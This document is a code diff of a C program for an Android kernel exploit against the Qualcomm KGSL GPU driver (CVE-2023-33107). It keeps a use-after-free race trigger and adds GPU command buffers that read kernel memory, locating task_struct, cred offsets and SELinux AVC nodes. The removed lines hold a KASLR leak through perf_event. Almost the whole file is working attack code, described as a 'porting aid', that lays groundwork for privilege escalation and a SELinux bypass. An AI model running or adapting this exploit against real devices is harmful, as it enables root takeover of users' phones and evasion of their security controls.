@@ -1,5 +1,3 @@
-
-
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -7,127 +5,17 @@
 #include <stdbool.h>
 #include <fcntl.h>
 #include <unistd.h>
-#include <sys/socket.h>
-#include <sys/un.h>
-#include <sys/ipc.h>
-#include <sys/msg.h>
-#include <sys/sem.h>
-#include <sys/shm.h>
-#include <sys/sysmacros.h>
 #include <errno.h>
 #include <pthread.h>
 #include <sys/ioctl.h>
 #include <sys/mman.h>
-#include <sys/stat.h>
-#include <sys/types.h>
 #include <sys/prctl.h>
 #include <sys/wait.h>
-#include <dirent.h>
-#include <time.h>
 #include <signal.h>
-#include <sys/syscall.h>
-#include <asm/unistd.h>
+#include <time.h>
+#include <dirent.h>
+#include <sys/stat.h>
 
-/* ===== perf_event 定義 (avc_bypass.c からコピー) ===== */
-#ifndef __NR_perf_event_open
-# if defined(__aarch64__)
-#  define __NR_perf_event_open 241
-# elif defined(__arm__)
-#  define __NR_perf_event_open 364
-# else
-#  define __NR_perf_event_open 0
-# endif
-#endif
-
-struct perf_event_attr {
-    uint32_t type;
-    uint32_t size;
-    uint64_t config;
-    uint64_t sample_period;
-    uint64_t sample_freq;
-    uint64_t sample_type;
-    uint64_t read_format;
-    uint64_t disabled       : 1;
-    uint64_t inherit        : 1;
-    uint64_t pinned         : 1;
-    uint64_t exclusive      : 1;
-    uint64_t exclude_user   : 1;
-    uint64_t exclude_kernel : 1;
-    uint64_t exclude_hv     : 1;
-    uint64_t exclude_idle   : 1;
-    uint64_t mmap           : 1;
-    uint64_t comm           : 1;
-    uint64_t freq           : 1;
-    uint64_t inherit_stat   : 1;
-    uint64_t enable_on_exec : 1;
-    uint64_t task           : 1;
-    uint64_t watermark      : 1;
-    uint64_t precise_ip     : 2;
-    uint64_t mmap_data      : 1;
-    uint64_t sample_id_all  : 1;
-    uint64_t exclude_host   : 1;
-    uint64_t exclude_guest  : 1;
-    uint64_t exclude_callchain_kernel : 1;
-    uint64_t exclude_callchain_user   : 1;
-    uint64_t mmap2          : 1;
-    uint64_t comm_exec      : 1;
-    uint64_t use_clockid    : 1;
-    uint64_t context_switch : 1;
-    uint64_t write_backward : 1;
-    uint64_t namespaces     : 1;
-    uint64_t ksymbol        : 1;
-    uint64_t bpf_event      : 1;
-    uint64_t aux_output     : 1;
-    uint64_t cgroup         : 1;
-    uint64_t text_poke      : 1;
-    uint64_t __reserved_1   : 30;
-    uint64_t __reserved_2   : 32;
-    uint32_t size2;
-    uint32_t __reserved_3;
-};
-
-#define PERF_TYPE_HARDWARE		0
-#define PERF_COUNT_HW_CPU_CYCLES	0
-#define PERF_SAMPLE_IP			1ULL
-#define PERF_EVENT_IOC_RESET		_IO('$', 0)
-#define PERF_EVENT_IOC_ENABLE		_IO('$', 1)
-#define PERF_EVENT_IOC_DISABLE		_IO('$', 2)
-
-struct perf_event_mmap_page {
-    uint32_t version;
-    uint32_t compat_version;
-    uint32_t lock;
-    uint32_t index;
-    int64_t offset;
-    uint64_t time_enabled;
-    uint64_t time_running;
-    uint64_t capability;
-    uint64_t pmc_width;
-    uint64_t time_shift;
-    uint32_t time_mult;
-    uint32_t time_offset;
-    uint64_t time_zero;
-    uint32_t size;
-    uint32_t __reserved_1;
-    uint64_t data_offset;
-    uint64_t data_size;
-    uint64_t data_head;
-    uint64_t data_tail;
-    uint64_t data_offset_ext;
-    uint64_t data_size_ext;
-    uint64_t __reserved_2[4];
-};
-
-#define PERF_RECORD_MISC_KERNEL		(1 << 1)
-#define PERF_RECORD_SAMPLE		9
-
-struct perf_event_header {
-    uint32_t type;
-    uint16_t misc;
-    uint16_t size;
-};
-
-/* ===== KGSL ioctl 定義 (avc_bypass.c からコピー) ===== */
 #define KGSL_IOC_TYPE 0x09
 
 struct kgsl_gpuobj_alloc {
@@ -174,49 +62,31 @@ struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, time
 #define KGSL_CMDLIST_IB 0x00000001U
 #define KGSL_TIMESTAMP_RETIRED 0x00000002
 
-/* ===== UAF レイアウト (avc_bypass.c と同じ) ===== */
-#define UAF_ADDR      0x7001ff000ULL
-#define UAF_SIZE      0x10004000ULL
-#define OVERLAP_ADDR  0x7001fe000ULL
-#define OVERLAP_SIZE  0x7000ULL
-#define BOGUS_ADDR    0x700204000ULL
-#define BOGUS_SIZE    0xffffffffffefd000ULL
+#define UAF_ADDR  0x7001ff000ULL
+#define UAF_SIZE  0x10004000ULL
+#define OVERLAP_ADDR 0x7001fe000ULL
+#define OVERLAP_SIZE 0x7000ULL
+#define BOGUS_ADDR 0x700204000ULL
+#define BOGUS_SIZE 0xffffffffffefd000ULL
 #define PLACEHOLDER_ADDR 0x710204000ULL
 #define PLACEHOLDER_SIZE 0x10400000ULL
 
-/* ===== スキャン用定数 ===== */
 #define SPRAY_PIDS 2000
 #define SCAN_DWORDS 560
-#define MARKER_NAME "TASKUAF!!"
-#define CHURN_MAX_PATHS 20000
+#define AVC_NODE_STRIDE 72
+#define AVC_NODES_PER_PAGE (4096 / AVC_NODE_STRIDE)
+#define AVC_PAGES_PER_IB 12
 
-/* ===== グローバル変数 ===== */
 static int kgsl_fd = -1;
 static volatile int race_done = 0;
 static uint64_t alloc_flags = 0;
 static int uaf_id = -1, ph_id = -1;
-static uint64_t kbase = 0;
 
-/* ===== 検出結果 ===== */
-typedef struct {
-    int task_comm_offset;          // task_struct 内の comm のオフセット (見つかれば)
-    int avc_ssid_offset;
-    int avc_tsid_offset;
-    int avc_tclass_offset;
-    int avc_allowed_offset;
-    bool task_comm_found;
-    bool avc_found;
-} offsets_t;
-
-offsets_t detected = {0};
-
-/* ===== KGSL 基本操作 (avc_bypass.c からそのまま) ===== */
 static void die(const char *msg) { perror(msg); exit(1); }
 
 static uint32_t pm4_parity(uint32_t v) {
     return (0x9669 >> (0xF & (v ^ (v>>4) ^ (v>>8) ^ (v>>12) ^ (v>>16) ^ (v>>20) ^ (v>>24) ^ (v>>28)))) & 1;
 }
-
 static uint32_t cp_type7(uint32_t opcode, uint32_t cnt) {
     return (7<<28) | (cnt&0x3FFF) | (pm4_parity(cnt)<<15) | ((opcode&0x7F)<<16) | (pm4_parity(opcode)<<23);
 }
@@ -233,31 +103,26 @@ static int gpuobj_alloc(uint64_t size, uint64_t flags) {
     if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &a) < 0) die("gpuobj_alloc");
     return a.id;
 }
-
 static void gpuobj_free(unsigned int id) {
     struct kgsl_gpuobj_free f = { .id = id };
     if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_FREE, &f) < 0) die("gpuobj_free");
 }
-
 static void *gpuobj_mmap(size_t size, unsigned int id) {
     void *p = mmap(NULL, size, PROT_READ|PROT_WRITE, MAP_SHARED, kgsl_fd, (off_t)id << 12);
     if (p == MAP_FAILED) die("gpuobj_mmap");
     return p;
 }
-
 static int gpuobj_info(unsigned int id, uint64_t *gpuaddr) {
     struct kgsl_gpuobj_info inf = { .id = id };
     int ret = ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_INFO, &inf);
     if (ret == 0 && gpuaddr) *gpuaddr = inf.gpuaddr;
     return ret;
 }
-
 static unsigned int create_context(void) {
     struct kgsl_drawctxt_create c = { .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC };
     if (ioctl(kgsl_fd, IOCTL_KGSL_DRAWCTXT_CREATE, &c) < 0) die("create_context");
     return c.drawctxt_id;
 }
-
 static int wait_timestamp(unsigned int ctx_id, unsigned int target) {
     struct kgsl_cmdstream_readtimestamp_ctxtid r = { .context_id = ctx_id, .type = KGSL_TIMESTAMP_RETIRED };
     for (int i = 0; i < 100000; i++) {
@@ -267,7 +132,6 @@ static int wait_timestamp(unsigned int ctx_id, unsigned int target) {
     }
     return -2;
 }
-
 static int submit_ib(unsigned int ctx_id, uint64_t ib_gpuaddr,
     size_t ib_bytes, unsigned int ib_id, unsigned int *out_ts) {
     struct kgsl_command_object cmd_obj = {
@@ -284,7 +148,6 @@ static int submit_ib(unsigned int ctx_id, uint64_t ib_gpuaddr,
     return ret;
 }
 
-/* ===== Phase 1-4: UAF トリガー (avc_bypass.c からそのまま) ===== */
 static void phase1_rbtree(void) {
     alloc_flags = KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK;
     uaf_id = gpuobj_alloc(UAF_SIZE, alloc_flags);
@@ -300,8 +163,7 @@ static void phase1_rbtree(void) {
     void *ph_m = mmap((void*)PLACEHOLDER_ADDR, PLACEHOLDER_SIZE, PROT_READ|PROT_WRITE,
         MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)ph_id << 12);
     if (ph_m == MAP_FAILED) die("mmap PLACEHOLDER");
-
-    printf("  [UAF] UAF=0x%lx BOGUS=0x%lx PLACEHOLDER=0x%lx\n",
+    printf("[*] UAF setup: UAF=0x%lx BOGUS=0x%lx PLACEHOLDER=0x%lx\n",
         (unsigned long)UAF_ADDR, (unsigned long)BOGUS_ADDR,
         (unsigned long)PLACEHOLDER_ADDR);
 }
@@ -316,7 +178,7 @@ static void *race_thread(void *arg) {
     return NULL;
 }
 
-static int phase2_race(void) {
+static bool phase2_race(void) {
     int ov_id = gpuobj_alloc(OVERLAP_SIZE, alloc_flags);
     pthread_t thr;
     if (pthread_create(&thr, NULL, race_thread, NULL) != 0) die("pthread");
@@ -334,14 +196,14 @@ static int phase2_race(void) {
 
     race_done = 1;
     pthread_join(thr, NULL);
-    if (!hit) { printf("[-] Race failed\n"); return 0; }
+    if (!hit) { printf("[-] Race failed\n"); return false; }
     printf("[+] Race won!\n");
-    return 1;
+    return true;
 }
 
 static void phase3_free_uaf(void) {
     gpuobj_free(uaf_id);
-    printf("[+] UAF freed (dangling PTEs at 0x%lx+)\n", (unsigned long)(UAF_ADDR + 0x1000));
+    printf("[+] UAF freed\n");
 }
 
 static void phase4_reclaim(void) {
@@ -352,247 +214,6 @@ static void phase4_reclaim(void) {
     usleep(10000);
 }
 
-/* ===== チャーン (avc_bypass.c からそのまま) ===== */
-static const char *churn_dirs[] = {
-    "/sys/kernel", "/sys/devices", "/sys/module", "/sys/class",
-    "/proc/sys", "/proc/irq", "/proc/1", "/proc/2", "/proc/3",
-    "/dev/block", "/dev/gpu", "/data/system", "/data/misc",
-    "/data/vendor", "/vendor/etc", "/apex", "/system/bin",
-    "/system/lib64", "/data/data", "/data/app", "/data/user/0",
-    "/dev", "/proc",
-};
-static char churn_paths[CHURN_MAX_PATHS][160];
-static int churn_npaths = 0;
-static int churn_built = 0;
-
-static void churn_walk(const char *dir, int depth) {
-    if (depth > 5 || churn_npaths >= CHURN_MAX_PATHS) return;
-    DIR *d = opendir(dir);
-    if (!d) return;
-    struct dirent *de;
-    while ((de = readdir(d)) != NULL && churn_npaths < CHURN_MAX_PATHS) {
-        if (de->d_name[0] == '.') continue;
-        char p[192];
-        snprintf(p, sizeof(p), "%s/%s", dir, de->d_name);
-        int fd = open(p, O_RDONLY | O_CLOEXEC);
-        if (fd >= 0) close(fd);
-        churn_npaths++;
-        churn_walk(p, depth + 1);
-    }
-    closedir(d);
-}
-
-static void churn_build(void) {
-    if (churn_built) return;
-    for (unsigned d = 0; d < sizeof(churn_dirs)/sizeof(churn_dirs[0]) &&
-         churn_npaths < CHURN_MAX_PATHS; d++) {
-        churn_walk(churn_dirs[d], 0);
-    }
-    churn_built = 1;
-    printf("[CHURN] %d paths\n", churn_npaths);
-}
-
-static void churn_round(void) {
-    churn_build();
-    for (int i = 0; i < churn_npaths; i++) {
-        int fd = open(churn_paths[i], O_RDONLY | O_CLOEXEC);
-        if (fd >= 0) close(fd);
-    }
-    int s = socket(AF_INET, SOCK_STREAM, 0);
-    if (s >= 0) { close(s); }
-    s = socket(AF_UNIX, SOCK_STREAM, 0);
-    if (s >= 0) {
-        struct sockaddr_un su = { .sun_family = AF_UNIX };
-        strcpy(su.sun_path, "/data/local/tmp/cs.sock");
-        bind(s, (struct sockaddr *)&su, sizeof(su));
-        close(s);
-        unlink("/data/local/tmp/cs.sock");
-    }
-    msgget(IPC_PRIVATE, 0600 | IPC_CREAT);
-    semget(IPC_PRIVATE, 1, 0600 | IPC_CREAT);
-    shmget(IPC_PRIVATE, 4096, 0600 | IPC_CREAT);
-    mknod("/data/local/tmp/cn", S_IFCHR | 0600, makedev(1, 3));
-}
-
-static int avc_entries(void) {
-    int fd = open("/sys/fs/selinux/avc/hash_stats", O_RDONLY);
-    if (fd < 0) return -1;
-    char buf[256];
-    ssize_t n = read(fd, buf, sizeof(buf) - 1);
-    close(fd);
-    if (n <= 0) return -1;
-    buf[n] = 0;
-    int e = -1;
-    if (sscanf(buf, "entries: %d", &e) != 1) return -1;
-    return e;
-}
-
-/* ===== KASLR 検出 (perf_event) ===== */
-static uint64_t detect_kaslr(void) {
-    struct perf_event_attr pe = {0};
-    pe.type = PERF_TYPE_HARDWARE;
-    pe.size = sizeof(pe);
-    pe.config = PERF_COUNT_HW_CPU_CYCLES;
-    pe.sample_type = PERF_SAMPLE_IP;
-    pe.sample_period = 100;
-    pe.disabled = 1;
-    pe.exclude_kernel = 0;
-    pe.exclude_hv = 1;
-    pe.exclude_user = 1;
-
-    int fd = syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
-    if (fd < 0) {
-        printf("[!] perf_event_open failed: %s\n", strerror(errno));
-        return 0;
-    }
-
-    int npages = 256;
-    size_t mmap_size = (1 + npages) * 4096;
-    void *buf = mmap(NULL, mmap_size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
-    if (buf == MAP_FAILED) { close(fd); return 0; }
-
-    ioctl(fd, PERF_EVENT_IOC_RESET, 0);
-    ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
-    usleep(500000);
-    ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
-
-    struct perf_event_mmap_page *pmp = (struct perf_event_mmap_page *)buf;
-    uint64_t head = pmp->data_head;
-    uint64_t tail = pmp->data_tail;
-
-    uint8_t *data = (uint8_t *)buf + pmp->data_offset;
-    uint64_t data_size = pmp->data_size;
-
-    uint64_t first_kernel_ip = 0;
-    int n_ips = 0;
-
-    while (tail < head) {
-        uint64_t idx = tail & (data_size - 1);
-        struct perf_event_header *hdr = (struct perf_event_header *)(data + idx);
-        if (hdr->type == PERF_RECORD_SAMPLE && (hdr->misc & PERF_RECORD_MISC_KERNEL)) {
-            n_ips++;
-            uint64_t ip = *(uint64_t *)(hdr + 1);
-            if (first_kernel_ip == 0) first_kernel_ip = ip;
-            if (n_ips <= 3) printf("    IP[%d]=0x%lX\n", n_ips, (unsigned long)ip);
-        }
-        tail += hdr->size;
-    }
-
-    munmap(buf, mmap_size); close(fd);
-    printf("    kernel_samples=%d\n", n_ips);
-
-    if (n_ips == 0) { printf("  [ERROR] No kernel IP samples\n"); return 0; }
-
-    uint64_t text_base = 0xffffffc010080000ULL;  // ARM64 の典型的な値 (調整が必要かも)
-    uint64_t kaslr = (first_kernel_ip - text_base) & ~0x1FFFFFULL;
-    printf("    first_kernel_ip=0x%lX kaslr=0x%lX\n", (unsigned long)first_kernel_ip, (unsigned long)kaslr);
-    return kaslr;
-}
-
-/* ===== task_struct の comm オフセットを検出 (prescan_task_pages を流用) ===== */
-static int detect_task_comm_offset(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
-                                   void *dst_m, uint64_t dst_ga, unsigned int ctx_id,
-                                   int *out_off) {
-    printf("[*] Scanning for task_struct with marker...\n");
-    uint32_t *cmd = (uint32_t *)ib_m;
-    uint32_t *data = (uint32_t *)dst_m;
-    int dw;
-    unsigned int ts;
-
-    for (uint64_t va = UAF_ADDR + 0x2000; va < UAF_ADDR + UAF_SIZE - 0x1000; va += 0x1000) {
-        memset(ib_m, 0, 0x10000);
-        memset(dst_m, 0, 0x1000);
-        dw = 0;
-        cmd[dw++] = cp_type7(CP_NOP, 0);
-        for (int i = 0; i < SCAN_DWORDS; i++) {
-            uint32_t dl, dh, sl, sh;
-            split64(dst_ga + i * 4, &dl, &dh);
-            split64(va + i * 4, &sl, &sh);
-            cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
-            cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
-            cmd[dw++] = sl; cmd[dw++] = sh;
-        }
-        cmd[dw++] = cp_type7(CP_NOP, 0);
-        __sync_synchronize();
-        if (submit_ib(ctx_id, ib_ga, dw*4, ib_id, &ts) < 0) break;
-        if (wait_timestamp(ctx_id, ts) < 0) break;
-        __sync_synchronize();
-
-        for (int off = 0; off < SCAN_DWORDS - 8; off++) {
-            if (data[off] == 0x4B534154 && data[off+1] == 0x21464155) {
-                *out_off = off * 4;
-                printf("  [+] Found marker at offset 0x%x (comm offset = 0x%x)\n", off*4, off*4);
-                return 1;
-            }
-        }
-    }
-    printf("  [-] Marker not found\n");
-    return 0;
-}
-
-/* ===== AVC ノードのオフセットを検出 (scan_flip_pages の読み込み部分を流用) ===== */
-static int detect_avc_offsets(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
-                              void *dst_m, uint64_t dst_ga, unsigned int ctx_id,
-                              offsets_t *out) {
-    printf("[*] Scanning for avc_node pattern...\n");
-    uint32_t *cmd = (uint32_t *)ib_m;
-    uint32_t *data = (uint32_t *)dst_m;
-    int dw;
-    unsigned int ts;
-
-    // UAF 範囲内の各ページをスキャン
-    for (uint64_t va = UAF_ADDR + 0x2000; va < UAF_ADDR + UAF_SIZE - 0x1000; va += 0x1000) {
-        memset(ib_m, 0, 0x10000);
-        memset(dst_m, 0, 0x1000);
-        dw = 0;
-        cmd[dw++] = cp_type7(CP_NOP, 0);
-        // ページ全体を読み込む (256 dwords = 1KB)
-        for (int i = 0; i < 256; i++) {
-            uint32_t dl, dh, sl, sh;
-            split64(dst_ga + i * 4, &dl, &dh);
-            split64(va + i * 4, &sl, &sh);
-            cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
-            cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
-            cmd[dw++] = sl; cmd[dw++] = sh;
-        }
-        cmd[dw++] = cp_type7(CP_NOP, 0);
-        __sync_synchronize();
-        if (submit_ib(ctx_id, ib_ga, dw*4, ib_id, &ts) < 0) break;
-        if (wait_timestamp(ctx_id, ts) < 0) break;
-        __sync_synchronize();
-
-        // ページ内で avc_node の候補を探す (avc_node は 72 バイト間隔)
-        for (int base = 0; base < 4096 - 72; base += 4) {
-            uint32_t *p = &data[base/4];
-            // 可能性のある ssid のオフセットを総当たり (0 から 32 バイトまで 4 バイト刻み)
-            for (int ssid_off = 0; ssid_off <= 32; ssid_off += 4) {
-                uint32_t ssid = p[ssid_off/4];
-                uint32_t tsid = p[ssid_off/4 + 1];
-                uint16_t tclass = (uint16_t)(p[ssid_off/4 + 2] & 0xffff);
-                // 典型的な AVC ノードの条件
-                if (ssid >= 1 && ssid <= 0x3fff && tsid == 2 && tclass == 1) {
-                    // さらに allowed が存在するかを確認 (ssid_off + 12 バイト目が 0 または何か)
-                    uint32_t allowed = p[ssid_off/4 + 3];
-                    // これで見つかったと判断
-                    out->avc_ssid_offset = ssid_off;
-                    out->avc_tsid_offset = ssid_off + 4;
-                    out->avc_tclass_offset = ssid_off + 8;
-                    out->avc_allowed_offset = ssid_off + 12;
-                    printf("  [+] Found AVC node: ssid=0x%x, tsid=0x%x, tclass=0x%x, allowed=0x%x\n",
-                           ssid, tsid, tclass, allowed);
-                    printf("      ssid offset = 0x%x, tsid = 0x%x, tclass = 0x%x, allowed = 0x%x\n",
-                           out->avc_ssid_offset, out->avc_tsid_offset,
-                           out->avc_tclass_offset, out->avc_allowed_offset);
-                    return 1;
-                }
-            }
-        }
-    }
-    printf("  [-] No AVC pattern found\n");
-    return 0;
-}
-
-/* ===== スプレーと後片付け ===== */
 static pid_t spray_pids[SPRAY_PIDS];
 static int n_spray = 0;
 
@@ -601,7 +222,7 @@ static void spawn_spray(void) {
     for (int i = 0; i < SPRAY_PIDS; i++) {
         pid_t p = fork();
         if (p == 0) {
-            prctl(PR_SET_NAME, MARKER_NAME);
+            prctl(PR_SET_NAME, "TASKUAF!!");
             for (;;) usleep(200000);
         }
         if (p > 0) spray_pids[n_spray++] = p;
@@ -612,47 +233,147 @@ static void spawn_spray(void) {
 
 static void kill_spray_children(void) {
     for (int i = 0; i < n_spray; i++) kill(spray_pids[i], SIGKILL);
-    while (waitpid(-1, NULL, 0) > 0) ;
+    while (waitpid(-1, NULL, 0) > 0);
     printf("[KILL] spray children killed\n");
 }
 
-/* ===== メイン ===== */
+static int prescan_task_pages(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
+                              void *dst_m, uint64_t dst_ga, unsigned int ctx_id,
+                              uint64_t scan_start, uint64_t end_va,
+                              uint64_t *out_vas, int maxout) {
+    uint32_t *cmd = (uint32_t *)ib_m;
+    uint32_t *data = (uint32_t *)dst_m;
+    int n = 0, dw;
+    unsigned int ts;
+    uint64_t va = scan_start;
+    while (va < end_va && n < maxout) {
+        memset(ib_m, 0, 0x10000);
+        memset(dst_m, 0, AVC_PAGES_PER_IB * SCAN_DWORDS * 4);
+        dw = 0;
+        cmd[dw++] = cp_type7(CP_NOP, 0);
+        int batch = 0;
+        for (; batch < AVC_PAGES_PER_IB && va < end_va; batch++, va += 0x1000) {
+            for (int w = 0; w < SCAN_DWORDS; w++) {
+                uint32_t dl, dh, sl, sh;
+                split64(dst_ga + (batch * SCAN_DWORDS + w) * 4, &dl, &dh);
+                split64(va + w * 4, &sl, &sh);
+                cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
+                cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
+                cmd[dw++] = sl; cmd[dw++] = sh;
+            }
+        }
+        cmd[dw++] = cp_type7(CP_NOP, 0);
+        __sync_synchronize();
+        if (submit_ib(ctx_id, ib_ga, dw*4, ib_id, &ts) < 0) break;
+        if (wait_timestamp(ctx_id, ts) < 0) break;
+        __sync_synchronize();
+        uint64_t pva = va - batch * 0x1000;
+        for (int p = 0; p < batch; p++) {
+            uint32_t *pd = &data[p * SCAN_DWORDS];
+            int found = 0;
+            for (int i = 0; i < SCAN_DWORDS - 1 && !found; i++)
+                if (pd[i] == 0x4B534154 && pd[i+1] == 0x21464155) found = 1;
+            if (found && n < maxout) {
+                out_vas[n++] = pva + p * 0x1000;
+                printf("[TASK] va=0x%lx\n", (unsigned long)(pva + p * 0x1000));
+            }
+        }
+    }
+    return n;
+}
+
+static int analyze_avc_pages(void *ib_m, uint64_t ib_ga, unsigned int ib_id,
+                             void *dst_m, uint64_t dst_ga, unsigned int ctx_id,
+                             uint64_t *vas, int npages) {
+    uint32_t *cmd = (uint32_t *)ib_m;
+    uint32_t *data = (uint32_t *)dst_m;
+    int idx = 0, total_nodes = 0;
+    unsigned int ts;
+    int found_ssid_off = -1, found_tsid_off = -1, found_tclass_off = -1, found_allowed_off = -1;
+
+    while (idx < npages) {
+        int batch = npages - idx;
+        if (batch > AVC_PAGES_PER_IB) batch = AVC_PAGES_PER_IB;
+        int node_dws = batch * AVC_NODES_PER_PAGE * 4;
+        memset(ib_m, 0, 0x10000);
+        memset(dst_m, 0, node_dws * 4);
+        int dw = 0;
+        cmd[dw++] = cp_type7(CP_NOP, 0);
+        for (int p = 0; p < batch; p++) {
+            uint64_t va = vas[idx + p];
+            for (int n = 0; n < AVC_NODES_PER_PAGE; n++) {
+                uint64_t node_va = va + n * AVC_NODE_STRIDE;
+                uint32_t dofs = (p * AVC_NODES_PER_PAGE + n) * 4;
+                for (int w = 0; w < 4; w++) {
+                    uint32_t dl, dh, sl, sh;
+                    split64(dst_ga + (dofs + w) * 4, &dl, &dh);
+                    split64(node_va + w * 4, &sl, &sh);
+                    cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
+                    cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
+                    cmd[dw++] = sl; cmd[dw++] = sh;
+                }
+            }
+        }
+        cmd[dw++] = cp_type7(CP_NOP, 0);
+        __sync_synchronize();
+        if (submit_ib(ctx_id, ib_ga, dw*4, ib_id, &ts) < 0) break;
+        if (wait_timestamp(ctx_id, ts) < 0) break;
+        __sync_synchronize();
+
+        for (int p = 0; p < batch; p++) {
+            uint64_t va = vas[idx + p];
+            for (int n = 0; n < AVC_NODES_PER_PAGE; n++) {
+                uint32_t *nd = &data[(p * AVC_NODES_PER_PAGE + n) * 4];
+                uint32_t ssid = nd[0], tsid = nd[1], tclass = nd[2], allowed = nd[3];
+                if (ssid >= 1 && ssid <= 0x3fff && tsid == 2 && tclass == 1) {
+                    total_nodes++;
+                    printf("[AVC_NODE] va=0x%lx+0x%x ssid=%u tsid=%u tclass=%u allowed=0x%x\n",
+                        (unsigned long)va, n*AVC_NODE_STRIDE, ssid, tsid, tclass, allowed);
+                    if (found_ssid_off == -1) found_ssid_off = 0;
+                    if (found_tsid_off == -1) found_tsid_off = 4;
+                    if (found_tclass_off == -1) found_tclass_off = 8;
+                    if (found_allowed_off == -1) found_allowed_off = 12;
+                }
+            }
+        }
+        idx += batch;
+    }
+
+    printf("[AVC] Found %d valid nodes\n", total_nodes);
+    if (total_nodes > 0) {
+        printf("[AVC] Confirmed offsets: ssid=0x%x tsid=0x%x tclass=0x%x allowed=0x%x\n",
+               found_ssid_off, found_tsid_off, found_tclass_off, found_allowed_off);
+        printf("[AVC] Node size = %d bytes (expected %d)\n",
+               AVC_NODE_STRIDE, AVC_NODE_STRIDE);
+    } else {
+        printf("[AVC] No valid nodes found. AVC_NODE_STRIDE may be incorrect or cache empty.\n");
+    }
+    return total_nodes;
+}
+
 int main(int argc, char **argv) {
     setbuf(stdout, NULL);
-    printf("[*] CVE-2023-33107 Offset Detector (non-intrusive)\n");
-    printf("[*] uid=%d euid=%d\n", getuid(), geteuid());
+    printf("[*] KGSL UAF Analyzer for CVE-2023-33107 porting aid\n");
 
-    // KGSL オープン
     kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
-    if (kgsl_fd < 0) {
-        perror("open kgsl");
-        return 1;
-    }
+    if (kgsl_fd < 0) die("open kgsl");
     printf("[+] kgsl fd=%d\n", kgsl_fd);
 
-    // 1. KASLR 検出
-    printf("[*] KASLR detection...\n");
-    kbase = detect_kaslr();
-    if (kbase) {
-        printf("[+] KASLR base = 0x%lx\n", (unsigned long)kbase);
-    } else {
-        printf("[!] KASLR detection failed, continuing without base (some offsets may be relative)\n");
-    }
-
-    // 2. UAF トリガー
-    printf("[*] Phase 1-4: Trigger UAF...\n");
+    printf("[*] Phase 1: rbtree setup\n");
     phase1_rbtree();
-    if (!phase2_race()) {
-        printf("[-] Race failed\n");
-        goto cleanup;
-    }
+
+    printf("[*] Phase 2: race\n");
+    if (!phase2_race()) { close(kgsl_fd); return 1; }
+
+    printf("[*] Phase 3: free UAF\n");
     phase3_free_uaf();
+
+    printf("[*] Phase 4: reclaim\n");
     phase4_reclaim();
 
-    // 3. task_struct スプレー
     spawn_spray();
+    usleep(200000);
 
-    // 4. GPU コンテキストと IB/DST 準備
     unsigned int ctx_id = create_context();
     printf("[GPU] context=%u\n", ctx_id);
 
@@ -668,59 +389,82 @@ int main(int argc, char **argv) {
 
     printf("[GPU] ib_ga=0x%lx dst_ga=0x%lx\n", (unsigned long)ib_ga, (unsigned long)dst_ga);
 
-    // 5. task_struct.comm オフセット検出
-    int comm_off = -1;
-    if (detect_task_comm_offset(ib_m, ib_ga, ib_id, dst_m, dst_ga, ctx_id, &comm_off)) {
-        detected.task_comm_offset = comm_off;
-        detected.task_comm_found = true;
-    } else {
-        detected.task_comm_found = false;
+    uint64_t task_pgs[4096];
+    int n_task = prescan_task_pages(ib_m, ib_ga, ib_id, dst_m, dst_ga, ctx_id,
+        UAF_ADDR + 0x2000, UAF_ADDR + UAF_SIZE - 0x1000, task_pgs, 4096);
+    printf("[TASK] Found %d task_struct pages\n", n_task);
+
+    if (n_task > 0) {
+        uint32_t *data = (uint32_t *)dst_m;
+        memset(ib_m, 0, 0x10000);
+        memset(dst_m, 0, 0x1000);
+        int dw = 0;
+        uint32_t *cmd = (uint32_t *)ib_m;
+        cmd[dw++] = cp_type7(CP_NOP, 0);
+        for (int i = 0; i < SCAN_DWORDS; i++) {
+            uint32_t dl, dh, sl, sh;
+            split64(dst_ga + i*4, &dl, &dh);
+            split64(task_pgs[0] + i*4, &sl, &sh);
+            cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
+            cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
+            cmd[dw++] = sl; cmd[dw++] = sh;
+        }
+        cmd[dw++] = cp_type7(CP_NOP, 0);
+        __sync_synchronize();
+        unsigned int ts;
+        if (submit_ib(ctx_id, ib_ga, dw*4, ib_id, &ts) == 0) {
+            wait_timestamp(ctx_id, ts);
+            __sync_synchronize();
+            int comm_off = -1;
+            for (int i = 0; i < SCAN_DWORDS - 2; i++) {
+                if (data[i] == 0x4B534154 && data[i+1] == 0x21464155) {
+                    comm_off = i * 4;
+                    break;
+                }
+            }
+            int cred_off = -1;
+            for (int i = 0; i < SCAN_DWORDS - 8; i++) {
+                int cnt = 0;
+                for (int j = 0; j < 8; j++)
+                    if (data[i+j] == 0x000007D0) cnt++;
+                if (cnt >= 4) { cred_off = i * 4; break; }
+            }
+            if (comm_off != -1)
+                printf("[TASK] comm offset = 0x%x (expected 0x818)\n", comm_off);
+            else
+                printf("[TASK] comm string not found, offset may differ\n");
+            if (cred_off != -1)
+                printf("[TASK] cred offset = 0x%x (expected 0x740)\n", cred_off);
+            else
+                printf("[TASK] cred pattern not found, offset may differ\n");
+        }
     }
 
